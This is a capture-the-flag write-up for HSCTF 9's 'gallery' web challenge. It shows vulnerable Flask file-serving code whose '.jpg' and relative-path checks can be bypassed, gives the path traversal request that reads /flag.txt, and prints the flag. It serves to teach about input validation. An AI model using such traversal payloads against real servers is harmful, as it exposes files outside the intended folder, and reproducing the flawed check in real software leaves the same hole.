## Introduction
The _gallery_ was a Web challenge presented at the [HSCTF](https://ctf.hsctf.com/). The challenge linked to a website and contained the code of the website.

The website showed a collection of images:
![image](https://user-images.githubusercontent.com/26695258/173675629-c041e269-ab09-4dcc-9d80-e888c825366e.png)

The code contained the following endpoint:

```python
@app.route("/flag")
def flag():
	if 2 + 2 == 5:
		return send_file("/flag.txt")
	else:
		return "No.", 400

```

Since the `if` branch is impossible to achieve, an attack is needed to get the flag.

## Attack vector
Apart from the `flag` endpoint there are two more endpoints present in the code. The root path simply renders the `index.html`. It does not present any interesting opportunities:
```python
@app.route("/")
def index():
	images = [p.name for p in IMAGE_FOLDER.iterdir()]
	return render_template("index.html", images=images)
```

The other endpoint is more promising:
```python
@app.route("/image")
def image():
	if "image" not in request.args:
		return "Image not provided", 400
	if ".jpg" not in request.args["image"]:
		return "Invalid filename", 400
	
	file = IMAGE_FOLDER.joinpath(Path(request.args["image"]))
	if not file.is_relative_to(IMAGE_FOLDER):
		return "Invalid filename", 400
	
	try:
		return send_file(file.resolve())
	except FileNotFoundError:
		return "File does not exist", 400
```

The endpoint sends a file using a request parameter to resolve its path. The IMAGE_FOLDER is defined in code as `/images`. An example request could be:

`GET /image?image=ImageName.jpg`

This request would return an image found in the server's filesystem under path: `/images/ImageName.jpg`. The flag's location is `/flag.txt`.

The validation in the method forces the request to fulfil the following criteria:
- it contain the parameter `image`
- the parameter `image` contains string `.jpg`
- the parameter `image` is relative to the /images folder (can't be an absolute path)

## Execution

The parameter's value that meets the requirements and exploits the website it:

`image.jpg/../../../../../../../../flag.txt`

The Operating System resolves the path in the following way:
1. start in the `/images/image.jpg`
2. move up the file tree multiple times (the multiple `..` ensures we land in the root directory)
3. resolve a file `flag.txt` in the foot directory

To sum up, the exploit request is:

`GET /image?image=image.jpg/../../../../../../../../flag.txt`

and it returns the flag:

`flag{1616109079_is_a_cool_number}`

Conclusion: sanitize user input 😁

---
_HSCTF 9 was held on 06-11.06.2022_

_Shout out to [kzawistowski](https://github.com/kzawistowski) for participating in the CTF with me!_
